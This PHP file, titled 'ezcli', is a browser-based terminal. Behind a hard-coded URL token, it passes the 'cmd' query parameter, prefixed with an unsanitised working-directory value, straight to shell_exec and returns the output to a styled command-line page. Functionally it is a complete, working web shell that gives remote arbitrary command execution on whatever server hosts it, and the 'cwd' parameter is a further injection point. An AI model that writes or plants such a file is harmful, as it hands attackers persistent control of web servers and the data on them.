<?php

const TOKEN = 'apodjaofapejefopaef';

if (!array_key_exists(TOKEN, $_GET)) die("nope");

if(array_key_exists("cmd", $_GET)){
    $cmd = $_GET['cmd'];
    if ($cmd) {
        $cwd = array_key_exists("cwd", $_GET) ? $_GET['cwd'] : null;
        if ($cwd) $cmd = "cd $cwd; $cmd";
        echo htmlentities(shell_exec($cmd . " 2>&1"));
        exit;
    }
}

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>ezcli</title>
    <style>
        :root{
            --background-color: #111;
            --text-color: #bbb;
            --accent-color: #26A69A;
        }
        * {
            box-sizing: border-box;
            padding: 0;
            margin: 0;
            font-family: monospace;
        }

        *::selection {
            background: var(--accent-color);
            color: white;
        }

        body {
            background: var(--background-color);
            color: var(--text-color);
            padding: 1rem;
            padding-right: 0;
            display: flex;
            flex-direction: column-reverse;
            height: 100vh;
        }

        #input {
            display: flex;
            gap: 0.5rem;
        }
        #cwd {
            display: flex;
            color: var(--accent-color);
            white-space: nowrap;
        }
        #cwd:after {
            content: ":";
        }

        input#cmd {
            width: 100%;
            background: transparent;
            color: inherit;
            border: unset;
            outline: none;
        }

        input#cmd:disabled {
            opacity: 0.5;
        }

        #output {
            display: flex;
            flex-direction: column-reverse;
            overflow-y: auto;
        }

        hr {
            margin-top: 1rem;
        }
        pre {
            white-space: pre-wrap;
        }
        pre > strong {
            color: var(--accent-color);
        }
        h1 {
            position: fixed;
            top: 0;
            right: 0.2em;
            opacity: 0.1;
            font-size: 10vw;
            pointer-events: none;
        }
        h1 strong {
            color: var(--accent-color);
        }
    </style>
</head>
<body>
<h1><strong>ez</strong>cli</h1>
<div id="input">
    <strong id="cwd"></strong>
    <input id="cmd" placeholder="Enter your command" autocomplete="off" spellcheck="false">
</div>
<div id="output">

</div>
<script>
    let history = []
    let historyIndex = 0
    var output = document.getElementById('output')
    var cmd = document.getElementById('cmd')
    var cwd = ""
    var cwdElement = document.getElementById('cwd')


    async function init() {
        cwd = await get("pwd")
        cwdElement.innerHTML = cwd
        bind()
        cmd.focus()
    }

    function bind() {
        cmd.addEventListener('keyup', async (e) => {
            switch (e.key) {
                case "Enter":
                    cmd.disabled = true
                    let cmdText = cmd.value
                    if(cmdText.match(/^cd/)){
                        cmdText += "; pwd"
                        cwd = await get(cmdText)
                        cwd = cwd.replace("\r", "").replace("\n", "")
                        cwdElement.innerHTML = cwd
                    }
                    else {
                        let text = await get(cmdText)
                        output.innerHTML = `<pre><strong>${cwd.replace("\r", "").replace("\n", "")}: ${cmd.value}</strong><br><pre>${text}</pre></pre>${output.innerHTML}`
                    }
                    history.push(cmd.value)
                    cmd.value = ""
                    cmd.disabled = false
                    cmd.focus()
                    break;
                case "ArrowUp":
                    historyIndex = Math.min(history.length, historyIndex + 1)
                    if (history[history.length - historyIndex]) cmd.value = history[history.length - historyIndex]
                    break;
                case "ArrowDown":
                    historyIndex = Math.max(0, historyIndex - 1)
                    if (history[history.length - historyIndex]) cmd.value = history[history.length - historyIndex]
                    else cmd.value = ""
                    break;
                default:
                    historyIndex = 0;
                    break;
            }
        })
    }

    async function get(cmd) {
        return await fetch(`?<?= TOKEN ?>=1&cmd=${cmd}&cwd=${cwd}`).then(res => res.text())
    }

    init()
</script>
</body>
</html>